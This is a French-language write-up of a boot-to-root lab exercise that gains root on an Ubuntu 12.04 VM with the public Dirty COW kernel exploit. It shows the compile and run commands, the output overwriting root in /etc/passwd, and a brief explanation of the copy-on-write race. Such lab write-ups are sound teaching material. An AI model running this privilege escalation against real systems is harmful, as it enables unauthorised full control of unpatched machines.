# Writeup numéro 2:
## Étape 0 - Lancement de la VM:
![BootToRoot](assets/start_vm.png)

## Étape 1 - Connexion à la VM par ssh

Nous pouvons nous connecter à la VM avec les idéntifiants zaz trouvés avec la méthode décrite sur le [writeup1](writeup1.md)

## Étape 2 - Vérification de la version du kernel:

Une fois connectés en ssh, nous vérifions la version du kernel linux.

```SH
$> uname -r
3.2.0-91-generic-pae
```

Nous vérifions aussi la version de la distribution linux.

```sh
$> lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 12.04.5 LTS
Release:	12.04
Codename:	precise
```
## Étape 3 - Récherche et lancement de l'exploit

Si nous cherchons sur internet et sur [exploit-db](https://www.exploit-db.com/), nous pouvons voir qu'il existe une vulnérabilité publique pour la version du kernel 2.6.22 < 3.9.

Une fois le code de l'exploit [Dirty COW](https://www.exploit-db.com/exploits/40839) copié, on crée un fichier dirty.c sur le terminal connecté en ssh et on le compile.
```sh
$>gcc -pthread dirty.c -o dirty -lcrypt
```

Il nous demande ensuite un mot de passe, on peut mettre `1234`.

```sh
$> ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
```

Après l'exécution du programme, le user root aura été remplacé par firefart (on peut changer ce nom par défaut en modifiant le code) et nous pourrons nous connecter avec le mot de passe choisi.

```
Complete line:
firefart:fionu3giiS71.:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '1234'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '1234'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
$> su
Password:
firefart@BornToSecHackMe:/home/zaz# id
uid=0(firefart) gid=0(root) groups=0(root)
```

`Youpi on est root !!`

## Un peu plus d'explications

Le script utilisé exploite une faille de sécurité dans le système Copy On Write qui a été présent sur le noyau Linux pendant très longtemps. Copy On Write ou `COW` permets gagner du temps quand on fait une copie. Quand on accède à l'élément copié, on a accès encore à l'élément original et la copie n'est pas faite que quand cet élément est modifié. S'il y a un problème, les données peuvent s'écrire dans un emplacement mémoire qui ne leurs correspond pas.

L'exploit qui permet écrire sur un fichier qui, à priori, est de lecture seul (par exemple `/ect/passwd`), suit ces pas :

* Fait un mapping privé du fichier à écrire (même si le contexte est de lecture, il peut être écrit car il est privé).

```c
map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
```

* En même temps qu'il écrit, il lance l'appel system [madvise()](http://man7.org/linux/man-pages/man2/madvise.2.html) pour indiquer au kernel qu'il peut libérer temporairement la mémoire utilisée par le fichier asigné. À chaque fois que l'on veut écrire il faut charger une nouvelle copie, ce qui prends du temps et, si le cycle Copy On Write n'a pas encore fini, on peut écrire sur l'original au lieu de la copie en mémoire.

Vous pouvez voir une explication plus detaillée sur le fonctionement de l'exploit [ici](https://www.youtube.com/watch?v=kEsshExn7aE).